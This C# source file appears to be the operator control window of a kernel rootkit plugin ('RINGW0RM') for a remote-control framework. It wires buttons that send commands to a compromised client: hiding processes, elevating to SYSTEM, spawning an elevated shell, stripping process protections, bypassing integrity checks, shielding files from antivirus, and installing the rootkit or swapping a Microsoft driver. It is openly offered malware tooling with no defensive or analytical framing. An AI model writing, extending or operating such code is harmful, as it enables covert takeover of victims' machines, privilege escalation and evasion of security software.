using System;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using Pulsar.Plugin.Ring0.Common;
using MessagePack;

namespace Pulsar.Plugin.Ring0.Server
{
    /// <summary>
    /// Rootkit Control Form - RINGW0RM GUI
    /// </summary>
    public class RootkitControlForm : Form
    {
        private readonly string _clientId;
        private readonly Action<string, string, byte[]> _sendCommand;
        private readonly RootkitStatus _status;

        // Colors
        private static readonly Color BgDark = Color.FromArgb(30, 30, 30);
        private static readonly Color BgPanel = Color.FromArgb(45, 45, 48);
        private static readonly Color FgText = Color.FromArgb(220, 220, 220);
        private static readonly Color BgButton = Color.FromArgb(60, 60, 65);
        private static readonly Color BgTextBox = Color.FromArgb(37, 37, 38);
        private static readonly Color BorderClr = Color.FromArgb(67, 67, 70);
        private static readonly Color ClrSuccess = Color.FromArgb(87, 166, 74);
        private static readonly Color ClrError = Color.FromArgb(207, 102, 121);
        private static readonly Color ClrWarn = Color.FromArgb(220, 160, 50);

        // Controls
        private Label lblConnStatus, lblDrvStatus, lblDseStatus, lblSbStatus;
        private TextBox txtPid, txtProtPid, txtFilename, txtAllowedPid, txtLog;
        private ComboBox cboType, cboSigner;
        private Button btnHide, btnElevate, btnSpawn, btnUnprotAll, btnSetProt;
        private Button btnRestrict, btnBypass, btnProtAV;
        private Button btnConnect, btnInstall, btnUninstall, btnSwap, btnRefresh;

        public RootkitControlForm(string clientId, RootkitStatus status, Action<string, string, byte[]> sendCommand)
        {
            _clientId = clientId;
            _status = status ?? new RootkitStatus();
            _sendCommand = sendCommand;
            BuildUI();
            UpdateStatusDisplay();
        }

        private void BuildUI()
        {
            // Form settings - disable DPI scaling
            this.AutoScaleMode = AutoScaleMode.None;
            this.Text = $"RINGW0RM Control - {_clientId}";
            this.Size = new Size(900, 700);
            this.MinimumSize = new Size(900, 700);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.BackColor = BgDark;
            this.ForeColor = FgText;
            this.Font = new Font("Segoe UI", 9.5f);
            this.Padding = new Padding(10);

            int W = this.ClientSize.Width;
            int pad = 15;
            int fullW = W - pad * 2;
            int halfW = (fullW - pad) / 2;
            int y = pad;

            // ============ STATUS PANEL ============
            var pnlStatus = MakePanel(pad, y, fullW, 65);
            lblConnStatus = MakeLabel("○ Rootkit Not Connected", 12, true);
            lblConnStatus.Location = new Point(15, 10);
            lblConnStatus.Size = new Size(400, 24);
            lblDrvStatus = MakeLabel("Driver: Not Loaded", 9.5f, false);
            lblDrvStatus.Location = new Point(15, 36);
            lblDrvStatus.Size = new Size(400, 20);
            lblDseStatus = MakeLabel("DSE: Unknown", 10, false);
            lblDseStatus.Location = new Point(430, 10);
            lblDseStatus.Size = new Size(400, 24);
            lblSbStatus = MakeLabel("Secure Boot: Unknown", 9.5f, false);
            lblSbStatus.Location = new Point(430, 36);
            lblSbStatus.Size = new Size(400, 20);
            pnlStatus.Controls.AddRange(new Control[] { lblConnStatus, lblDrvStatus, lblDseStatus, lblSbStatus });
            this.Controls.Add(pnlStatus);
            y += 80;

            // ============ PROCESS OPERATIONS ============
            var grpProc = MakeGroup("Process Operations", pad, y, halfW, 140);
            grpProc.Controls.Add(MakeLabelAt("PID:", 15, 25, 50, 22));
            txtPid = MakeTextBox(70, 22, 150);
            grpProc.Controls.Add(txtPid);
            btnHide = MakeButton("Hide Process", 15, 55, 190, 32);
            btnHide.Click += (s, e) => SendPidCmd(Ring0Commands.CMD_HIDE_PROCESS);
            grpProc.Controls.Add(btnHide);
            btnElevate = MakeButton("Elevate to SYSTEM", 215, 55, 190, 32);
            btnElevate.Click += (s, e) => SendPidCmd(Ring0Commands.CMD_ELEVATE_PROCESS);
            grpProc.Controls.Add(btnElevate);
            btnSpawn = MakeButton("Spawn Elevated CMD", 15, 95, 190, 32);
            btnSpawn.Click += (s, e) => _sendCommand(_clientId, Ring0Commands.CMD_SPAWN_ELEVATED, null);
            grpProc.Controls.Add(btnSpawn);
            btnUnprotAll = MakeButton("Unprotect All Processes", 215, 95, 190, 32);
            btnUnprotAll.Click += (s, e) => _sendCommand(_clientId, Ring0Commands.CMD_UNPROTECT_ALL, null);
            grpProc.Controls.Add(btnUnprotAll);
            this.Controls.Add(grpProc);

            // ============ PROCESS PROTECTION ============
            var grpProt = MakeGroup("Process Protection", pad + halfW + pad, y, halfW, 140);
            grpProt.Controls.Add(MakeLabelAt("PID:", 15, 25, 50, 22));
            txtProtPid = MakeTextBox(70, 22, 120);
            grpProt.Controls.Add(txtProtPid);
            grpProt.Controls.Add(MakeLabelAt("Type:", 15, 55, 50, 22));
            cboType = MakeCombo(70, 52, 150, new[] { "None", "Light", "Full" });
            grpProt.Controls.Add(cboType);
            grpProt.Controls.Add(MakeLabelAt("Signer:", 15, 85, 55, 22));
            cboSigner = MakeCombo(75, 82, 145, new[] { "None", "Authenticode", "CodeGen", "Antimalware", "Lsa", "Windows", "WinTcb", "WinSystem", "App" });
            grpProt.Controls.Add(cboSigner);
            btnSetProt = MakeButton("Set Protection", 240, 52, 160, 60);
            btnSetProt.Click += (s, e) => SendProtCmd();
            grpProt.Controls.Add(btnSetProt);
            this.Controls.Add(grpProt);
            y += 155;

            // ============ FILE OPERATIONS ============
            var grpFile = MakeGroup("File Operations", pad, y, fullW, 110);
            grpFile.Controls.Add(MakeLabelAt("Filename:", 15, 28, 75, 22));
            txtFilename = MakeTextBox(95, 25, 500);
            grpFile.Controls.Add(txtFilename);
            grpFile.Controls.Add(MakeLabelAt("Allowed PID:", 610, 28, 95, 22));
            txtAllowedPid = MakeTextBox(710, 25, 130);
            grpFile.Controls.Add(txtAllowedPid);
            btnRestrict = MakeButton("Restrict File Access", 15, 62, 200, 35);
            btnRestrict.Click += (s, e) => SendFileCmd(Ring0Commands.CMD_RESTRICT_FILE);
            grpFile.Controls.Add(btnRestrict);
            btnBypass = MakeButton("Bypass Integrity Check", 230, 62, 220, 35);
            btnBypass.Click += (s, e) => SendFilenameCmd(Ring0Commands.CMD_BYPASS_INTEGRITY);
            grpFile.Controls.Add(btnBypass);
            btnProtAV = MakeButton("Protect File Against AV", 465, 62, 220, 35);
            btnProtAV.Click += (s, e) => SendFilenameCmd(Ring0Commands.CMD_PROTECT_FILE_AV);
            grpFile.Controls.Add(btnProtAV);
            this.Controls.Add(grpFile);
            y += 125;

            // ============ DRIVER OPERATIONS ============
            var grpDrv = MakeGroup("Driver Operations", pad, y, fullW, 75);
            int bw = 155, bx = 15;
            btnConnect = MakeButton("Connect", bx, 28, bw, 35); bx += bw + 12;
            btnConnect.Click += (s, e) => _sendCommand(_clientId, Ring0Commands.CMD_CONNECT_ROOTKIT, null);
            grpDrv.Controls.Add(btnConnect);
            btnInstall = MakeButton("Install Rootkit", bx, 28, bw, 35); bx += bw + 12;
            btnInstall.Click += (s, e) => _sendCommand(_clientId, Ring0Commands.CMD_INSTALL_ROOTKIT, null);
            grpDrv.Controls.Add(btnInstall);
            btnUninstall = MakeButton("Uninstall", bx, 28, bw, 35); bx += bw + 12;
            btnUninstall.Click += (s, e) => _sendCommand(_clientId, Ring0Commands.CMD_UNINSTALL_ROOTKIT, null);
            grpDrv.Controls.Add(btnUninstall);
            btnSwap = MakeButton("Swap MS Driver", bx, 28, bw, 35); bx += bw + 12;
            btnSwap.Click += (s, e) => _sendCommand(_clientId, Ring0Commands.CMD_SWAP_DRIVER, null);
            grpDrv.Controls.Add(btnSwap);
            btnRefresh = MakeButton("Refresh Status", bx, 28, bw, 35);
            btnRefresh.Click += (s, e) => _sendCommand(_clientId, Ring0Commands.CMD_CHECK_STATUS, null);
            grpDrv.Controls.Add(btnRefresh);
            this.Controls.Add(grpDrv);
            y += 90;

            // ============ LOG ============
            var lblLog = MakeLabelAt("Log:", pad, y, 50, 20);
            this.Controls.Add(lblLog);
            y += 22;
            txtLog = new TextBox
            {
                Location = new Point(pad, y),
                Size = new Size(fullW, 130),
                Multiline = true,
                ScrollBars = ScrollBars.Vertical,
                ReadOnly = true,
                Font = new Font("Consolas", 9.5f),
                BackColor = BgTextBox,
                ForeColor = FgText,
                BorderStyle = BorderStyle.FixedSingle
            };
            this.Controls.Add(txtLog);
        }

        // Helper: Create styled panel
        private Panel MakePanel(int x, int y, int w, int h)
        {
            return new Panel
            {
                Location = new Point(x, y),
                Size = new Size(w, h),
                BackColor = BgPanel,
                BorderStyle = BorderStyle.FixedSingle
            };
        }

        // Helper: Create styled group box
        private GroupBox MakeGroup(string text, int x, int y, int w, int h)
        {
            return new GroupBox
            {
                Text = text,
                Location = new Point(x, y),
                Size = new Size(w, h),
                ForeColor = FgText,
                Font = new Font("Segoe UI", 9.5f)
            };
        }

        // Helper: Create styled label
        private Label MakeLabel(string text, float fontSize, bool bold)
        {
            return new Label
            {
                Text = text,
                AutoSize = false,
                ForeColor = FgText,
                Font = new Font("Segoe UI", fontSize, bold ? FontStyle.Bold : FontStyle.Regular)
            };
        }

        private Label MakeLabelAt(string text, int x, int y, int w, int h)
        {
            return new Label
            {
                Text = text,
                Location = new Point(x, y),
                Size = new Size(w, h),
                ForeColor = FgText,
                Font = new Font("Segoe UI", 9.5f)
            };
        }

        // Helper: Create styled textbox
        private TextBox MakeTextBox(int x, int y, int w)
        {
            return new TextBox
            {
                Location = new Point(x, y),
                Size = new Size(w, 26),
                BackColor = BgTextBox,
                ForeColor = FgText,
                BorderStyle = BorderStyle.FixedSingle,
                Font = new Font("Segoe UI", 9.5f)
            };
        }

        // Helper: Create styled button
        private Button MakeButton(string text, int x, int y, int w, int h)
        {
            var btn = new Button
            {
                Text = text,
                Location = new Point(x, y),
                Size = new Size(w, h),
                FlatStyle = FlatStyle.Flat,
                BackColor = BgButton,
                ForeColor = FgText,
                Font = new Font("Segoe UI", 9.5f),
                Cursor = Cursors.Hand
            };
            btn.FlatAppearance.BorderColor = BorderClr;
            btn.FlatAppearance.MouseOverBackColor = Color.FromArgb(80, 80, 85);
            return btn;
        }

        // Helper: Create styled combobox
        private ComboBox MakeCombo(int x, int y, int w, string[] items)
        {
            var cbo = new ComboBox
            {
                Location = new Point(x, y),
                Size = new Size(w, 26),
                DropDownStyle = ComboBoxStyle.DropDownList,
                BackColor = BgTextBox,
                ForeColor = FgText,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Segoe UI", 9.5f)
            };
            cbo.Items.AddRange(items);
            cbo.SelectedIndex = 0;
            return cbo;
        }

        // ============ STATUS UPDATE ============
        private void UpdateStatusDisplay()
        {
            if (_status.DriverConnected)
            {
                lblConnStatus.Text = "● Connected to Rootkit";
                lblConnStatus.ForeColor = ClrSuccess;
            }
            else if (_status.DriverLoaded)
            {
                lblConnStatus.Text = "○ Driver Loaded (not connected)";
                lblConnStatus.ForeColor = ClrWarn;
            }
            else
            {
                lblConnStatus.Text = "○ Rootkit Not Connected";
                lblConnStatus.ForeColor = ClrError;
            }

            lblDrvStatus.Text = _status.DriverLoaded ? "Driver: Loaded" : "Driver: Not Loaded";
            lblDrvStatus.ForeColor = _status.DriverLoaded ? ClrSuccess : FgText;
            
            lblDseStatus.Text = _status.DseEnabled ? "DSE: Enabled (bootkit needed)" : "DSE: Disabled/Test Mode";
            lblDseStatus.ForeColor = _status.DseEnabled ? ClrError : ClrSuccess;
            
            lblSbStatus.Text = _status.SecureBootEnabled ? "Secure Boot: ON" : "Secure Boot: OFF";
            lblSbStatus.ForeColor = _status.SecureBootEnabled ? ClrWarn : FgText;

            SetControlsEnabled(_status.DriverConnected);
        }

        private void SetControlsEnabled(bool enabled)
        {
            btnHide.Enabled = enabled;
            btnElevate.Enabled = enabled;
            btnSpawn.Enabled = enabled;
            btnUnprotAll.Enabled = enabled;
            btnSetProt.Enabled = enabled;
            btnRestrict.Enabled = enabled;
            btnBypass.Enabled = enabled;
            btnProtAV.Enabled = enabled;
            btnSwap.Enabled = enabled;
        }

        // ============ COMMAND METHODS ============
        private void SendPidCmd(string cmd)
        {
            if (!int.TryParse(txtPid.Text, out int pid) || pid <= 0)
            {
                Log("Invalid PID");
                return;
            }
            _sendCommand(_clientId, cmd, BitConverter.GetBytes(pid));
            Log($"Sent {cmd} for PID {pid}");
        }

        private void SendProtCmd()
        {
            if (!int.TryParse(txtProtPid.Text, out int pid) || pid <= 0)
            {
                Log("Invalid PID");
                return;
            }
            var req = new ProcessRequest
            {
                Pid = pid,
                ProtType = (ProtectionType)cboType.SelectedIndex,
                ProtSigner = (ProtectionSigner)cboSigner.SelectedIndex
            };
            _sendCommand(_clientId, Ring0Commands.CMD_SET_PROTECTION, MessagePackSerializer.Serialize(req));
            Log($"Set protection for PID {pid}");
        }

        private void SendFileCmd(string cmd)
        {
            if (string.IsNullOrWhiteSpace(txtFilename.Text))
            {
                Log("Filename required");
                return;
            }
            int.TryParse(txtAllowedPid.Text, out int allowedPid);
            var req = new FileRequest { AllowedPid = allowedPid, Filename = txtFilename.Text };
            _sendCommand(_clientId, cmd, MessagePackSerializer.Serialize(req));
            Log($"Sent {cmd} for {txtFilename.Text}");
        }

        private void SendFilenameCmd(string cmd)
        {
            if (string.IsNullOrWhiteSpace(txtFilename.Text))
            {
                Log("Filename required");
                return;
            }
            _sendCommand(_clientId, cmd, Encoding.UTF8.GetBytes(txtFilename.Text));
            Log($"Sent {cmd} for {txtFilename.Text}");
        }

        // ============ PUBLIC METHODS ============
        public void Log(string msg)
        {
            if (txtLog.InvokeRequired)
            {
                txtLog.Invoke(new Action(() => Log(msg)));
                return;
            }
            txtLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}{Environment.NewLine}");
        }

        public void UpdateStatus(RootkitStatus status)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => UpdateStatus(status)));
                return;
            }
            if (status != null)
            {
                lblConnStatus.Text = status.DriverConnected ? "● Connected" : "○ Not Connected";
                lblConnStatus.ForeColor = status.DriverConnected ? ClrSuccess : ClrError;
                lblDrvStatus.Text = status.DriverLoaded ? "Driver: Loaded" : "Driver: Not Loaded";
                lblDseStatus.Text = status.DseEnabled ? "DSE: Enabled" : "DSE: Disabled/Test Mode";
                lblSbStatus.Text = status.SecureBootEnabled ? "Secure Boot: ON" : "Secure Boot: OFF";
                SetControlsEnabled(status.DriverConnected);
                Log(status.Message ?? "Status updated");
            }
        }

        public void HandleResponse(string command, bool success, string message)
        {
            Log($"{command}: {(success ? "SUCCESS" : "FAILED")} - {message}");
            if (command == Ring0Commands.CMD_INSTALL_ROOTKIT || 
                command == Ring0Commands.CMD_CONNECT_ROOTKIT ||
                command == Ring0Commands.CMD_UNINSTALL_ROOTKIT)
            {
                _sendCommand(_clientId, Ring0Commands.CMD_CHECK_STATUS, null);
            }
        }

        // Compatibility alias
        public void LogMessage(string msg) => Log(msg);
    }
}
